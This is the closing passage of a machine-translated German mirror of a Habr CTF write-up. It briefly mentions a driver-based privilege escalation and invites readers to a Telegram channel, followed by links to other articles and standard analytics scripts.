Tats√§chlich handelt es sich um eine sehr komplexe Maschine, f√ºr die ein ausgefeilter Umgang mit dieser Version von LPE erforderlich war. <br><br>  Nat√ºrlich war es sehr schwierig, die Sicherheitsanf√§lligkeit im Treiber auszunutzen, und ich bin der Community dankbar, die mir mit einem Hinweis darauf geholfen hat, wie ich zum Treiber komme, und einen Artikel √ºber die √§hnliche Ausnutzung der Sicherheitsanf√§lligkeit in mmap geteilt hat. <br><br>  Soll ich die Analyse der zur weiteren Verarbeitung gesendeten Maschinen weiterhin ver√∂ffentlichen?  Sie k√∂nnen sich uns <a href="https://t.me/RalfHackerChannel" rel="nofollow">per Telegramm anschlie√üen</a> .  Bauen wir eine Community auf, in der es Menschen geben wird, die sich in vielen Bereichen der IT auskennen. Dann k√∂nnen wir uns gegenseitig in allen Fragen der IT- und Informationssicherheit helfen. </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/de480454/">https://habr.com/ru/post/de480454/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../de480438/index.html">Digitale Veranstaltungen in Moskau vom 16. bis 22. Dezember</a></li>
<li><a href="../de480440/index.html">Digitale Veranstaltungen in St. Petersburg vom 16. bis 22. Dezember</a></li>
<li><a href="../de480444/index.html">Habra Detektiv: 24 Stunden aus dem Leben von 24 Publikationen</a></li>
<li><a href="../de480446/index.html">Schreiben des Grafana-Reverse-Proxys auf Go</a></li>
<li><a href="../de480452/index.html">OWASP Moscow Meetup # 9: Leistungsrekorde</a></li>
<li><a href="../de480458/index.html">Watch "Zelle der Zeit"</a></li>
<li><a href="../de480460/index.html">Grundlegende L√∂sung eines linearen Gleichungssystems. Seitenansicht</a></li>
<li><a href="../de480462/index.html">Wie ich √ºber eine doppelt verkn√ºpfte Liste f√ºr O (1) debattierte</a></li>
<li><a href="../de480466/index.html">Angaben zum Dialysator: Der Weg der Jedi</a></li>
<li><a href="../de480468/index.html">Tarantool Cartridge-Anwendungen ohne Aufwand bereitstellen (Teil 1)</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>